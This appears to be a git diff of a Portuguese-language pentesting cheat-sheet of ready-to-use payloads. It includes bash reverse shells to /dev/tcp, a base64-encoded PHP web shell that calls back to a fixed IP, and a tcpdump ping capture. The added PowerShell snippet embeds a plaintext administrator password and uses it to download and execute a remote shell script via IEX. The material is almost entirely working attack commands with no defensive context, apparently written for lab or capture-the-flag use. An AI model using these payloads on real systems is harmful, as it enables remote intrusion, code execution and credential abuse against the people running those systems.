@@ -1,7 +1,7 @@
 ## Payloads:  
 
 ### Bash:  
-`/bin/bash -c 'bash -i > /dev/tcp/$LHOST/$LPORT 0>&1`  
+`/bin/bash -c 'bash -i > /dev/tcp/$LHOST/$LPORT 0>&1'`  
 `bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1`  
 
 ## Shell reversa com script bash:  
@@ -17,4 +17,22 @@
 echo "echo $(echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.9.58.140/443 0>&1'\"); ?>" | base64) | base64 -d > shell.php"
 # Payload:
 #echo PD9waHAgZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjkuNTguMTQwLzQ0MyAwPiYxJyIpOyA/Pgo= | base64 -d > shell.php
+```
+
+### Capturar requisições do ping:
+```bash
+sudo tcpdump -i tun0 icmp
+```
+
+# Subir shell e executar com credencial do administrador
+
+```powershell
+# Variável com a senha em texto claro
+$SecPass = ConvertTo-SecureString 's67u84zKq8IXw' -AsPlainText -Force  
+
+# Variável com as credenciais do admin
+$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)  
+
+# Download da shell utilizando as credenciais e executando
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2:81/shell.ps1')" -Credential $cred
 ```
